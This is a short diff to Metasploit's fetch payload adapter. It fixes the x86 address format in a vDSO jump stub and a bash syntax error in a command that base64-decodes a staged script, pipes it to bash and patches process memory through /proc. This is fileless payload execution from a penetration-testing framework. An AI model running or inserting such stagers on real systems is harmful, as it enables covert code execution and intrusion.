@@ -300,7 +300,7 @@ module Msf::Payload::Adapter::Fetch
     when 'x64'
       %^48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0^
     when 'x86'
-      %^b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0^
+      %^b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0^
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
@@ -323,8 +323,9 @@ module Msf::Payload::Adapter::Fetch
     stage_cmd << 'dd bs=1 skip=$(echo $addr) <&3 >/dev/null 2>&1;'
     stage_cmd << 'printf $jmp >&3;'
 
-    cmd = "echo '#{Base64.strict_encode64(stage_cmd)}' | base64 -d | bash &;"
+    cmd = "echo '#{Base64.strict_encode64(stage_cmd)}' | base64 -d | bash & "
     cmd << 'cd /proc/$!;'
+    cmd << 'sleep 1;' #adding short pause to give process time to load file handle
     cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'
 
     cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
